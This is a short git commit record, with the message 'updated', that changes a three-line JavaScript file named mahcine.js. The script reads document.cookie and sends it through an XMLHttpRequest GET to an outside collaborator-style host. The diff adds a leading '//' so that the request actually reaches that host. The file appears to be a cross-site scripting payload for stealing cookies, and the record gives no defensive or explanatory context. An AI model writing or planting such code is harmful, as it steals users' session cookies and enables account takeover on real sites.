9f4251ce591d279c9aa7f21a5733ab4fb150fc05
douglasfsmn <woozy-punch-jumbo@duck.com>
2026-01-29 09:19:45 -0600

    updated

--- mahcine.js
+++ mahcine.js
@@ -1,3 +1,3 @@
 var xhttp = new XMLHttpRequest();
-xhttp.open('GET', '0bcth3scl7xu796q60ehfqcssjyam1aq.collab.hawkislandsol.com/?' + document.cookie, true);
+xhttp.open('GET', '//0bcth3scl7xu796q60ehfqcssjyam1aq.collab.hawkislandsol.com/?' + document.cookie, true);
 xhttp.send();
